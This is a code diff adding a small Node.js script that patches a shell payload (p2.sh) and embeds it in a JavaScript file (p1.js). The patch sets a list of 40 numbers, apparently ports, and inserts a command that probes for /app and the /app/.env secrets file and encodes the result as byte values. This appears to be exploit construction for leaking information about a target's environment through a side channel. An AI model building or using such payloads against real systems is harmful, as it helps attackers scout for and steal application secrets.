@@ -1,0 +1,10 @@
+const fs=require('fs');
+let s=fs.readFileSync('p2.sh','latin1');
+const list=Array.from({length:40},(_,i)=>5905+i).join(',');
+s=s.replace(/^L='[0-9,]+'/, "L='"+list+"'");
+s=s.replace(/^x=.*$/m, 'x=$({ echo -n "A"; ls -d /app 2>&1; ls -d /app/.env 2>&1; } | od -An -tu1 -N5 | tr -d " \\n")');
+fs.writeFileSync('p2.sh', s, 'latin1');
+let t=fs.readFileSync('p1.js','utf8');
+t=t.replace(/const S=.*\n/, 'const S='+JSON.stringify(s)+';\n');
+fs.writeFileSync('p1.js', t);
+console.log(s.split('\n').slice(0,2).join(' | '));
